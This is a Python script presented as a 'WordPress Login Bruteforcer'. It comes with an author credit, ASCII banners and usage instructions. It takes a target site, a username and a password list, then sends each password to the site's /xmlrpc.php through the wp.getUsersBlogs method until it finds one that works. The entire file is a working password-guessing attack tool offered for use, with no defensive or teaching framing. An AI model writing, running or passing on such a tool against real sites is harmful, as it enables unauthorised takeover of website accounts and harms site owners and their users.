import http.client
import sys
import colorama 
from colorama import Fore, Style

fig1 = """
      __   __   __   __   __   ___  __   __  
|  | /  \ |__) |  \ |__) |__) |__  /__` /__` 
|/\| \__/ |  \ |__/ |    |  \ |___ .__/ .__/ 
                                             """
fig2 = """
      __   __         
|    /  \ / _` | |\ | 
|___ \__/ \__> | | \| 
                      """
fig3 = """
 __   __       ___  ___  ___  __   __   __   ___  __  
|__) |__) |  |  |  |__  |__  /  \ |__) /  ` |__  |__) 
|__) |  \ \__/  |  |___ |    \__/ |  \ \__, |___ |  \ 
                                                      """
if (len(sys.argv) == 1):
	print(Fore.BLUE)
	print(fig1)
	print(fig2)
	print(fig3)
	print("Author: Mr_Cyborg (fb.me/oliverkahn.danny.3)\n")
	print("Usage: python3 site username passwordfile")
	print("example: python3 site.com admin passlist.txt")
	print(Style.RESET_ALL)
	exit()
	
site = sys.argv[1]
username = sys.argv[2]
passlist = sys.argv[3]
handle = open(passlist, "r")
lines = handle.read().splitlines()
print(Fore.BLUE)
print(fig1)
print(fig2)
print(fig3)
print("Author: Mr_Cyborg (fb.me/oliverkahn.danny.3)")
print("Attacking %s..." % site)

print(Fore.RED)
for password in lines:
	data = """<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>""" + username + """</value></param>
<param><value>""" + password + """</value></param>
</params>
</methodCall>"""
	conn = http.client.HTTPSConnection(site, 443)
	conn.request('POST',  '/xmlrpc.php', data)
	r = conn.getresponse()
	txt = r.read()
	txt = txt.decode('utf-8')
	print("Trying: %s" % password)
	if (len(txt) > 403):
		print(Fore.GREEN)
		print("success, password found: ")
		print(password)
		exit()
		
		
		
	else:
		
		print("Incorrect password")
		#print(txt)

		
print(Style.RESET_ALL)		
handle.close()
